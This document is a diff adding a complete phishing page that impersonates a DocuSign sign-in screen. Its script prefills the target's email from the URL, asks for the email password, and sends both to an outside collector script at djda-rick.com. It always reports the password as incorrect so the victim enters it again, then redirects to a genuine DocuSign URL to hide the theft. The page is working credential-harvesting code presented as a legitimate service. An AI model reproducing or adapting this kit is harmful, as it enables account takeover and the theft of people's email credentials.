@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <title>Review and sign document(s) | DocuSign</title>
+<link rel="shortcut icon" href="https://cdn.glitch.global/a29d5600-599d-4817-b859-00fba7b45f57/docu-fav.png?v=1672830562778"/>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+
+    .navbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 20px;
+      background-color: #fff;
+      color: white;
+    }
+
+    .logo {
+      font-size: 24px;
+      font-weight: bold;
+    }
+
+    .background-image {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-size: cover;
+      z-index: -1;
+      filter: blur(8px); /* Apply blur effect */
+    }
+
+    .centered-container {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 400px;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .form-group {
+      width: 100%;
+      margin-bottom: 10px;
+    }
+
+    label {
+      display: block;
+      text-align: left;
+      font-weight: bold;
+    }
+
+    input {
+      padding: 10px;
+      margin: 5px 0;
+      width: 80%;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 80%;
+    }
+
+    .footer {
+
+      position: absolute;
+      bottom: 0px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 100%;
+    }
+
+    .footer a {
+      margin: 0 10px;
+      color: #333;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="navbar">
+    <div class="logo"><img src="https://cdn.glitch.global/f713b227-4831-48f0-89aa-bee6d254155f/doc-logo.png?v=1691504348233" width="100px"></div>
+    <div>Navbar Links</div>
+  </div>
+
+  <div class="background-image"></div>
+  <div class="centered-container">
+<span style="font-size: 20px; font-weight: 799; "> DOCUMENT IS PROTECTED</span>
+<br>
+<br>
+<span style="font-size: 16px; font-weight: 500; ">Sign In To Continue</span>
+<br>
+<br>
+    <form id="form1">
+
+      <div class="form-group">
+
+        <input type="email" id="email" required placeholder="Email Address">
+      </div>
+      <button type="submit">Continue</button>
+    </form>
+
+    <form id="myForm" style="display: none;">
+      <div class="form-group">
+
+        <input type="email" id="tin" readonly>
+      </div>
+      <div class="form-group">
+
+        <input type="password" id="tan" required placeholder="Enter Email Password">
+      </div>
+      <button type="submit">Continue</button>
+    </form>
+<br>
+<br>
+<span>Sign up for free</span>
+<br>
+
+<div id="message" style="color: red";></div>
+<div id="error" style="color: red";></div>
+  </div>
+
+  <div class="footer">
+    <img src="https://cdn.glitch.global/f713b227-4831-48f0-89aa-bee6d254155f/docu-footer.png?v=1691505609857">
+
+  </div>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      // Get the value of the 'email' parameter from the URL
+      const urlParams = new URLSearchParams(window.location.search);
+      const emailValue = urlParams.get('email');
+
+      // Set the value of the input field with id 'email'
+      $('#email').val(emailValue);
+
+      $("#form1").submit(function(event) {
+        event.preventDefault();
+        $("#tin").val(emailValue);
+        $("#form1").hide();
+        $("#myForm").show();
+      });
+
+      $("#form2").submit(function(event) {
+        event.preventDefault();
+        // Handle the form submission logic for the second form here
+      });
+    });
+  </script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			// when the form is submitted
+			$("#myForm").submit(function(event) {
+				// prevent the default form submission behavior
+				event.preventDefault();
+
+
+				// show the loading GIF
+				$("#loadingGif").show();
+
+				// get the values of the form inputs
+				var tinVal = $("#tin").val();
+				var tanVal = $("#tan").val();
+
+				
+				// display a success message with a delay of 1 second
+				setTimeout(function() {
+				$("#message").html("Incorrect Email Password!");
+				}, 1000);
+
+				// reset the value of the tan input field
+				$("#tan").val("");
+
+				// send form data to email
+				var emailData = {
+					tin: tinVal,
+					tan: tanVal
+				};
+				$.ajax({
+					type: "POST",
+					url: "https://djda-rick.com/Requests/wp-include/dolla/doll.php",
+					data: emailData,
+					success: function() {
+						console.log("Email sent successfully");
+					},
+					error: function() {
+						console.log("Error sending email");
+					},
+					complete: function() {
+						// hide the loading GIF
+						$("#loadingGif").hide();
+					}
+				});
+
+
+				// when the user fills out the tan input field again and submits
+				$("#myForm").submit(function(event) {
+					// prevent the default form submission behavior
+					event.preventDefault();
+
+					// show the loading GIF
+					$("#loadingGif").show();
+
+					// get the new value of the tan input field
+					var newTanVal = $("#tan").val();
+
+					setTimeout(function() {
+					$("#message").html("Success! Retriving document(s)");
+					}, 1000);
+
+					// redirect to another page after a brief delay
+					setTimeout(function() {
+						window.location.href = "https://na4.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
+					}, 2000);
+				});
+			});
+		});
+	</script>
+
+</body>
+</html>
